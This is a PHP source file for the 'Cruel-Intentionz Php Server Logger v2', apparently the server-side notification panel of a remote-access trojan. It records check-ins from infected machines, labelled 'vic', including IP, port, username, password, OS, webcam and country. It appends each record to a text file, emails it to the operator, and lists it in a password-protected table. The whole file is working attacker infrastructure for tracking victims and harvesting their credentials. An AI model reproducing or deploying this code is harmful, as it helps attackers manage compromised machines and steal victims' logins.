<?php

/*
+--------------------------------------------------------------------------
|   CIA php logger
|   ========================================
|   by roger.raurdian
|   (c) 2001 - 2003 
|   http://www.cruel-intentionz.net
|   ========================================
|   Web: http://www.cruel-intentionz.net
|   Time: Thu, 15 Jan 2004 20:40:13 GMT
|   Release: ceeea615cace33fd7df61e60f57e5b5b
|   Email: rdgaurdian@hotmail.com
|   Licence Info: http://www.cruel-intentionz.net
+---------------------------------------------------------------------------
|
|   > Wrapper script
|   > Script written by Matthew lancerbrook
|   > Date started: 14th February 2003
|
+--------------------------------------------------------------------------
*/

$email="you@hotmail.com";
$file="vic.txt";
$msg="Vic Online";
$pwd="";
##################################################
#######################
$array_name_var=array(1=>"date",2=>"action",3=>"vicname",4=>"ip",5=>"port",6=>"usrname",7=>"password",8=>"server",9=>"opsys",10=>"webcam",11=>"country");
##################################################
#######################
error_reporting(0); 
IF($op != 1 && $op !=2 && !empty($HTTP_SERVER_VARS['QUERY_STRING']))
{
##################################################
#######################
function verif_email($mail){ 

if (empty($mail)) {return FALSE;}
elseif (strlen($mail) < 6){return FALSE;}
elseif (strlen($mail) > 255) {return FALSE;}
elseif (!ereg("@", $mail)){return FALSE;}
elseif (preg_match_all("/([^a-zA-Z0-9_\@\.\-])/i", $mail, $trouve)){return FALSE;}
elseif (!preg_match("/^([a-z0-9_]|\\-|\\.)+@(([a-z0-9_]|\\-)+\\.)+[a-z]{2,4}\$/i", $mail)){return FALSE;}
else{return TRUE;}
}
###############################################
if($HTTP_SERVER_VARS['REQUEST_METHOD']=="GET")
{
$array_var=$_GET; 
}
else
{
$array_var=$_POST; 
}
###############################################
$update="#"."\n".date("d-m-Y-H:i")."\n";

reset ($array_var);
while (list($key,$val)=each($array_var))
{
$update.=$key."=>".@trim(@str_replace("*","",$val))."\n";
}
if(verif_email($email)){mail($email,$msg,$update);
}

#########################
$fp=@fopen($file,"a+");
@fwrite($fp,$update);
@fclose($fp);
#########################

}
##################################################
####################### 
IF($op != 1 && empty($HTTP_SERVER_VARS['QUERY_STRING']))
{
if($HTTP_SERVER_VARS['QUERY_STRING']=="")
{
$title="Cruel-Intentionz Php Server Logger v2 [Enter Password]";
$input="Please enter password :";

print "<HTML><HEAD><TITLE>".$title."</Title></HEAD>
<BODY BGCOLOR=\"C6C7C6\">
<center><FORM ACTION=\"$PHP_SELF\">
<table width=\"40%\" cellpadding=\"1\" cellspacing=\"0\" border=\"1\" bgcolor=\"313431\" bordercolor =\"313431\"><br><br><br>
<tr bgcolor=\"5282AD\">
<td align=\"center\">
<font color=\"F7F7F7\" size=\"2\" face=\"Verdana\"><b>".$input."</b></font>
</td>
</tr>
<tr bgcolor=\"C6C7C6\">
<td align=\"center\">
<INPUT TYPE=\"password\" NAME=\"password\" SIZE=\"30%\">
<INPUT TYPE=\"hidden\" NAME=\"op\" VALUE=\"1\">
<INPUT TYPE=\"submit\" VALUE=\"OK\">
</td>
</tr>
</table>
</FORM></CENTER>
</BODY></HTML>";
exit(); 
}
}
##################################################
####################### 
IF($op==1)
{
if($pwd==$pass)
{
$title="Cruel-Intentionz Php Server Logger v2 ( Logged Servers )";

print "<HTML>
<HEAD>
<TITLE>".$title."</Title>
<style type=text/css><!--BODY {SCROLLBAR-FACE-COLOR:#006699; SCROLLBAR-HIGHLIGHT-COLOR:#313431; SCROLLBAR-SHADOW-COLOR: #313431; SCROLLBAR-ARROW-COLOR: #CCCCCC; SCROLLBAR-TRACK-COLOR: #CCCCCC; } A:active {COLOR: #2092B0; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A:hover {COLOR: #2092B0; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A:link {COLOR: #006699; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A {COLOR: #006699; FONT-FAMILY: Verdana; TEXT-DECORATION: none} --></style>
</HEAD>
<center>
<BODY BGCOLOR=\"C6C7C6\">
<table border=\"1\" cellpadding=\"4\" cellspacing=\"0\" bgcolor=\"5282AD\" bordercolor=\"black\">
<tr>
<td colspan=\"".(count($array_name_var)+2)."\"><br><font color=#F7F7F7 style=font-size:13 face=Verdana><b>Cruel-Intentionz Php Server Logger v2</b><br></td>
</tr>
<tr>";
for($i=1;$i<=count($array_name_var);$i++)
{
print "<td><font color=#F7F7F7 style=font-size:10 face=Verdana>".$array_name_var[$i]."</td>";
}
echo("</tr>");
##################################################
####################### 
$file_content=(@join("",@file($file)));
$array_file=(@explode("#",$file_content));

for($i=0;$i<count($array_file);$i++)
{
echo("<tr>");
$line[$i]=(explode("\n",$array_file[$i]));

for($j=0;$j<=count($array_name_var);$j++)
{

if(@ereg ("([0-9]{1,2})-([0-9]{1,2})-([0-9]{4})",$line[$i][$j])) 
{
echo("<td align=\"center\"><font color=#F7F7F7 style=font-size:10 face=Verdana>");
echo($line[$i][$j]);
echo("</td>");
}
else
{
for($s=0;$s<count($line[$i]);$s++)
{
if(!empty($line[$i][$s]) && !empty($array_name_var[$j]))
{
if(stristr($line[$i][$s],$array_name_var[$j]))
{
echo("<td align=\"center\"><font color=#F7F7F7 style=font-size:10 face=Verdana>");
echo(str_replace("=>","",strrchr($line[$i][$s],"=>")));
echo("</td>");
}
}

}
}
}

echo("</tr>");
}
exit;
}
else
{
$title="C.I.A - PHP-notify [invalid password]";
$input="Invalid password, try again :";

print "<HTML><HEAD><TITLE>".$title."</Title></HEAD>
<BODY BGCOLOR=\"C6C7C6\">
<center><FORM ACTION=\"$PHP_SELF\">
<table width=\"40%\" cellpadding=\"1\" cellspacing=\"0\" border=\"1\" bgcolor=\"313431\" bordercolor =\"313431\"><br><br><br>
<tr bgcolor=\"5282AD\">
<td align=\"center\">
<font color=\"424142\" size=\"2\" face=\"Verdana\"><b>".$input."</b></font>
</td>
</tr>
<tr bgcolor=\"C6C7C6\">
<td align=\"center\">
<INPUT TYPE=\"password\" NAME=\"pass\" SIZE=\"30%\">
<INPUT TYPE=\"hidden\" NAME=\"op\" VALUE=\"1\">
<INPUT TYPE=\"submit\" VALUE=\"OK\">
</td>
</tr>
</table>
</FORM></CENTER>
</BODY></HTML>";
exit(); 
}
}
?>
